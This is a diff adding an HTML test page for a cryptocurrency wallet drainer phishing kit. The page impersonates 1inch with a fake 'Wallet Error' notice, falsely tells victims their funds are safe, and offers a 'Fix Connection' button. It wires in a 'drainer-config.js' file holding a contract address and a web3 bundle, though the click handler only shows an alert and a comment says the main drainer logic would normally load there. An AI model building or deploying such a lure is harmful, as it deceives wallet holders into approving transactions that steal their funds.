@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Simple 1inch Test</title>
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <link href="css/normalize.css" rel="stylesheet" type="text/css" />
+    <link href="css/webflow.css" rel="stylesheet" type="text/css" />
+    <link href="css/anthonys-awesome-site-617708.webflow.css" rel="stylesheet" type="text/css" />
+    <style>
+        .debug-info {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <div class="debug-info">
+        <div>Status: <span id="status">Loading...</span></div>
+        <div>Config: <span id="config-status">Checking...</span></div>
+        <div>Web3: <span id="web3-status">Pending...</span></div>
+    </div>
+
+    <section class="section">
+        <div class="blurryj">
+            <div data-w-id="4459e431-d820-757d-a73d-5b3f686bac64"
+                style="transform: translate3d(0, 0, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);"
+                class="div-block">
+                
+                <img src="images/logo.svg" loading="lazy" alt="" class="image" />
+                <h1 class="heading">Wallet Error</h1>
+                
+                <div class="lottie-animation"
+                    data-w-id="3d254f45-d386-9046-0a78-a29acb2e79d8"
+                    data-animation-type="lottie"
+                    data-src="documents/Animation---1738159120499.json"
+                    data-loop="1"
+                    data-direction="1"
+                    data-autoplay="1"
+                    data-is-ix2-target="0"
+                    data-renderer="svg"
+                    data-default-duration="0"
+                    data-duration="0">
+                </div>
+                
+                <div class="text-block">
+                    We've detected a connection issue with your wallet on
+                    <strong class="bold-text">1inch</strong>. This may temporarily prevent
+                    you from trading or managing your positions. Please note that your
+                    funds are safe and remain in your wallet, a temporary safe wallet
+                    would be generated to store potential pending transactions until
+                    connection is restored.
+                </div>
+                
+                <div class="fix-button fixy" onclick="connectWallet()">
+                    <img src="images/connect.svg" loading="lazy" alt="" class="image-2" />
+                    <a class="text-block-2">Fix Connection</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script src="./js/drainer-config.js"></script>
+    <script>
+        // Simple debug and wallet connection
+        document.getElementById('status').textContent = 'Page Loaded';
+        
+        // Check config
+        setTimeout(() => {
+            if (typeof DRAINER_CONFIG !== 'undefined') {
+                document.getElementById('config-status').textContent = 'Loaded ✓';
+                console.log('Drainer config:', DRAINER_CONFIG);
+            } else {
+                document.getElementById('config-status').textContent = 'Failed ✗';
+            }
+        }, 100);
+
+        // Load web3 bundle
+        const script = document.createElement('script');
+        script.src = './js/web3-bundle.js';
+        script.onload = () => {
+            document.getElementById('web3-status').textContent = 'Loaded ✓';
+            console.log('Web3 bundle loaded');
+        };
+        script.onerror = () => {
+            document.getElementById('web3-status').textContent = 'Failed ✗';
+        };
+        document.head.appendChild(script);
+
+        function connectWallet() {
+            alert('Connect Wallet clicked!\n\nContract: ' + (DRAINER_CONFIG?.CONTRACT_ADDRESS || 'Not configured'));
+            console.log('Wallet connection initiated for:', DRAINER_CONFIG?.SITE_NAME);
+            
+            // Here you would normally load the main drainer logic
+            // For now, just show that it's working
+        }
+
+        // Prevent any hanging
+        setTimeout(() => {
+            document.getElementById('status').textContent = 'Ready';
+        }, 2000);
+    </script>
+</body>
+</html>
